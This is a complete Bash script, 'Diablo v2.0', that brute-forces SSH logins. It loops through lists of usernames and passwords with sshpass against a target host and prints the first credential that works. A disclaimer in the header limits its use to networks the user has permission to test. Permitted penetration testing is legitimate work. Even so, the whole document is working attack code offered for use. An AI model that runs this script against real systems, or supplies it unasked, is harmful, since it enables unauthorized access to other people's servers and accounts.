#!/usr/bin/env bash

# Diablo v2.0 Bash SSH bruteforce login hacker 
# This is free software: you are free to change it and redistribute it.
# If running this script in X, type 'unset DISPLAY' in terminal to avoid SSH authentication popup box.
# Please install sshpass before running this script. It is required by this script.
# Please do not abuse this tool. Use it on your own network or on networks you have permission to test.

start=$SECONDS

CNTRL-C() {
printf "\033[?25h\n"
exit
}
trap CNTRL-C INT

function elapsed_time {
end=$SECONDS
elapsed=$((end - start))
lines=$(wc -l < passwords | awk '{ $1=$1;print}')
lines2=$(wc -l < usernames | awk '{ $1=$1;print}')
total=$(($lines * $lines2))
printf "\r$count/$total password attempts in %02d:%02d:%02d " \
$((end / 3600)) $((end / 60 % 60)) $((end % 60)) \
$((elapsed / 3600)) $((elapsed / 60 % 60)) $((elapsed % 60))
}

sshpass -p root ssh -q -o connecttimeout=5 -p 22 root@$1 exit 2>&1; rval="$?"
if [ "$rval" == 255 ]; then echo Remote host does not support password authentication. && exit
fi

printf "\033[?25l"
echo "Attacking target --> $1"

for users in `cat usernames`; do
for passwd in  `cat passwords`; do
count=$((count+1))
elapsed_time
response=$(sshpass -p "$passwd" ssh -q -o connecttimeout=5 -p 22 $users@$1 echo 0 2>&1)
if  [[ $? == 0 ]] ; then printf "\nfound 1 password for user $users password:$passwd\n"
printf "\033[?25h"
exit
fi
done
done
printf "\nno passwords found\n"
printf "\033[?25h"
